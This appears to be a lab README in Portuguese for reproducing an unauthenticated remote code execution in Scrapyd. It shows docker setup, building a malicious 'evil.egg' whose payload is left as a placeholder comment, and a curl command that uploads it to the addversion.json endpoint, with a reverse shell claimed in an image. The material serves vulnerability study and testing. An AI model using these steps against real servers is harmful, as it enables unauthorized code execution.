# Scrapyd Unauthenticated Remote Code Execution

Scrapyd é um aplicativo para implantação e execução de aranhas Scrapy. Ele permite que os usuários implantem (upload) projetos e controlem seus spiders usando uma API JSON.

Referências: <https://www.leavesongs.com/PENETRATION/attack-scrapy.html>

## Iniciar servidor

Execute o seguinte comando para iniciar um servidor scrapyd:

```bash
docker-compose up -d
```

Depois que o scrapyd é implantado, o servidor está escutando em `http://your-ip:6800`.

## Reproduzir

Construa um arquivo evil.egg

```bash
pip install scrapy scrapyd-client
scrapy startproject evil
cd evil
# edit evil/__init__.py, add evil code
scrapyd-deploy --build-egg=evil.egg
```

Carregue o evil egg para o servidor scrapyd:

```bash
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

reverse shell foi realizada:

![](1.png)
